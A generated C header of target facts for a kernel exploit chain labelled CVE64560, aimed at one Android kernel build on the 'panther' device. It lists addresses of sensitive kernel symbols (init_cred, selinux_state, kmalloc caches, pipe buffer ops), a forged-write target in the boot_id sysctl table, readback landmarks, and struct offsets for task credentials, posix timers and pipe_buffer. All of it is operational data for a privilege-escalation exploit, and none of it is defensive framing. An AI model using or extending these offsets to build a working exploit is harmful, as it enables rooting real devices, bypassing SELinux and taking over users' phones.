/* Extra target facts for one exploit chain -- GENERATED, do not edit.
 * device panther build CP2A.260705.006
 * kernel 6.1.157-android14-11-gbd23337e42e7-ab14791245
 * SPL    2026-07-05
 * regenerate: runner/scripts/gen-cve64560-offsets.py data/live/panther-CP2A.260705.006
 *
 * Link-time symbol addresses and structure layouts the shared target
 * description does not carry, because only one chain walks them.
 */
#ifndef TARGET_FACTS_CVE64560_H
#define TARGET_FACTS_CVE64560_H

/* The target description this build compiles against, named on the
 * compile line rather than as a sibling file: a build whose header is
 * composed from its manifest row has no sibling to include. */
#include TARGET_HEADER

#ifndef KIMAGE_TEXT_BASE
#define KIMAGE_TEXT_BASE                 UINT64_C(0xffffffc008000000)
#endif
#ifndef LINK_IMAGE_BASE
#define LINK_IMAGE_BASE                  UINT64_C(0xffffffc008000000)
#endif
#ifndef PAGE_OFFSET_VA
#define PAGE_OFFSET_VA                   UINT64_C(0xffffff8000000000)
#endif

/* ---- kernel symbols (link-time addresses, keyed to this build) ---- */
#ifndef LINK_INIT_TASK
#define LINK_INIT_TASK                   UINT64_C(0xffffffc00a01f640)
#endif
#ifndef LINK_INIT_CRED
#define LINK_INIT_CRED                   UINT64_C(0xffffffc00a031aa8)
#endif
#ifndef LINK_SELINUX_STATE
#define LINK_SELINUX_STATE               UINT64_C(0xffffffc00a25a420)
#endif
#ifndef LINK_SELINUX_BLOB_SIZES
#define LINK_SELINUX_BLOB_SIZES          UINT64_C(0xffffffc0095ceb88)
#endif
#ifndef LINK_KMALLOC_CACHES
#define LINK_KMALLOC_CACHES              UINT64_C(0xffffffc0095cdfb8)
#endif
#ifndef LINK_ANON_PIPE_BUF_OPS
#define LINK_ANON_PIPE_BUF_OPS           UINT64_C(0xffffffc009109910)
#endif
#ifndef LINK_ASHMEM_IOCTL
#define LINK_ASHMEM_IOCTL                UINT64_C(0xffffffc008c38d28)
#endif
#ifndef LINK_ASHMEM_OPEN
#define LINK_ASHMEM_OPEN                 UINT64_C(0xffffffc008c398d8)
#endif
#ifndef LINK_ASHMEM_RELEASE
#define LINK_ASHMEM_RELEASE              UINT64_C(0xffffffc008c39960)
#endif
#ifndef LINK_CONFIGFS_READ_ITER
#define LINK_CONFIGFS_READ_ITER          UINT64_C(0xffffffc008464400)
#endif
#ifndef LINK_CONFIGFS_BIN_WRITE_ITER
#define LINK_CONFIGFS_BIN_WRITE_ITER     UINT64_C(0xffffffc008464930)
#endif
#ifndef LINK_MEMSTART_ADDR
#define LINK_MEMSTART_ADDR               UINT64_C(0xffffffc0095cdcc0)
#endif
#ifndef LINK_KIMAGE_VOFFSET
#define LINK_KIMAGE_VOFFSET              UINT64_C(0xffffffc0095cdd68)
#endif
#ifndef LINK_MODULE_DIRECT_BASE
#define LINK_MODULE_DIRECT_BASE          UINT64_C(0xffffffc0095cdcb8)
#endif
#ifndef LINK_MISC_LIST
#define LINK_MISC_LIST                   UINT64_C(0xffffffc00a137e00)
#endif
#ifndef LINK_UHID_MISC
#define LINK_UHID_MISC                   UINT64_C(0xffffffc00a176400)
#endif
#ifndef LINK_UHID_FOPS
#define LINK_UHID_FOPS                   UINT64_C(0xffffffc0092728c0)
#endif
#ifndef LINK_SYSCTL_BOOTID
#define LINK_SYSCTL_BOOTID               UINT64_C(0xffffffc00a27b498)
#endif
#ifndef LINK_RANDOM_TABLE
#define LINK_RANDOM_TABLE                UINT64_C(0xffffffc00a137c00)
#endif
#ifndef LINK_NFULNL_LOGGER
#define LINK_NFULNL_LOGGER               UINT64_C(0xffffffc00a0129d0)
#endif
#ifndef LINK_SDATA
#define LINK_SDATA                       UINT64_C(0xffffffc00a000000)
#endif
#ifndef LINK_END
#define LINK_END                         UINT64_C(0xffffffc00a1fba00)
#endif

/* ---- physmap aliases ---- */

/* ---- forged-write parent: &random_table[boot_id] ---- */
/* random_table[4] == boot_id; .data at +0x8 */
#ifndef DIRECT_BOOTID_PARENT
#define DIRECT_BOOTID_PARENT             UINT64_C(0xffffff8002137d00)
#endif
#ifndef DIRECT_BOOTID_DATA
#define DIRECT_BOOTID_DATA               UINT64_C(0xffffff8002137d08)
#endif

/* ---- stage0 readback landmark (2-element list cycle) ---- */
#ifndef LINK_CYCLE_C
#define LINK_CYCLE_C                UINT64_C(0xffffffc00a01fd30)
#endif
#ifndef DIRECT_CYCLE_C
#define DIRECT_CYCLE_C            UINT64_C(0xffffff800201fd30)
#endif
#ifndef LINK_CYCLE_D
#define LINK_CYCLE_D                UINT64_C(0xffffffc00a01e990)
#endif
#ifndef DIRECT_CYCLE_D
#define DIRECT_CYCLE_D            UINT64_C(0xffffff800201e990)
#endif

/* ---- struct layouts (BTF, exact for this image) ---- */
#ifndef KITIMER_SIZE
#define KITIMER_SIZE                     0x0108
#endif
#ifndef KITIMER_LIST_OFF
#define KITIMER_LIST_OFF                 0x0000
#endif
#ifndef KITIMER_IT_LOCK_OFF
#define KITIMER_IT_LOCK_OFF              0x0020
#endif
#ifndef KITIMER_IT_CLOCK_OFF
#define KITIMER_IT_CLOCK_OFF             0x0030
#endif
#ifndef KITIMER_IT_ID_OFF
#define KITIMER_IT_ID_OFF                0x0034
#endif
#ifndef KITIMER_IT_ACTIVE_OFF
#define KITIMER_IT_ACTIVE_OFF            0x0038
#endif
#ifndef KITIMER_IT_SIGNAL_OFF
#define KITIMER_IT_SIGNAL_OFF            0x0060
#endif
#ifndef KITIMER_SIGQ_OFF
#define KITIMER_SIGQ_OFF                 0x0070
#endif
#ifndef KITIMER_IT_UNION_OFF
#define KITIMER_IT_UNION_OFF             0x0078
#endif
#ifndef KITIMER_RCU_OFF
#define KITIMER_RCU_OFF                  0x00f8
#endif
#ifndef CPU_TIMER_SIZE
#define CPU_TIMER_SIZE                   0x0050
#endif
#ifndef CPU_TIMER_NODE_OFF
#define CPU_TIMER_NODE_OFF               0x0000
#endif
#ifndef CPU_TIMER_HEAD_OFF
#define CPU_TIMER_HEAD_OFF               0x0020
#endif
#ifndef CPU_TIMER_PID_OFF
#define CPU_TIMER_PID_OFF                0x0028
#endif
#ifndef CPU_TIMER_ELIST_OFF
#define CPU_TIMER_ELIST_OFF              0x0030
#endif
#ifndef CPU_TIMER_FIRING_OFF
#define CPU_TIMER_FIRING_OFF             0x0040
#endif
#ifndef TQ_NODE_SIZE
#define TQ_NODE_SIZE                     0x0020
#endif
#ifndef TQ_NODE_RB_OFF
#define TQ_NODE_RB_OFF                   0x0000
#endif
#ifndef TQ_NODE_EXPIRES_OFF
#define TQ_NODE_EXPIRES_OFF              0x0018
#endif
#ifndef TQ_HEAD_SIZE
#define TQ_HEAD_SIZE                     0x0010
#endif
#ifndef TASK_SIGHAND_OFF
#define TASK_SIGHAND_OFF                 0x0898
#endif
#ifndef TASK_SIGNAL_OFF
#define TASK_SIGNAL_OFF                  0x0890
#endif
#ifndef TASK_CRED_OFF
#define TASK_CRED_OFF                    0x0838
#endif
#ifndef TASK_TASKS_OFF
#define TASK_TASKS_OFF                   0x0550
#endif
#ifndef TASK_PID_OFF
#define TASK_PID_OFF                     0x0630
#endif
#ifndef TASK_TGID_OFF
#define TASK_TGID_OFF                    0x0634
#endif
#ifndef SIGNAL_POSIX_CPUTIMERS_OFF
#define SIGNAL_POSIX_CPUTIMERS_OFF       0x0120
#endif
#ifndef PIPE_BUFFER_SIZE
#define PIPE_BUFFER_SIZE                 0x0028
#endif
#ifndef PIPE_BUFFER_PAGE_OFF
#define PIPE_BUFFER_PAGE_OFF             0x0000
#endif
#ifndef PIPE_BUFFER_OPS_OFF
#define PIPE_BUFFER_OPS_OFF              0x0010
#endif
#ifndef PIPE_BUFFER_FLAGS_OFF
#define PIPE_BUFFER_FLAGS_OFF            0x0018
#endif

#endif /* TARGET_FACTS_CVE64560_H */
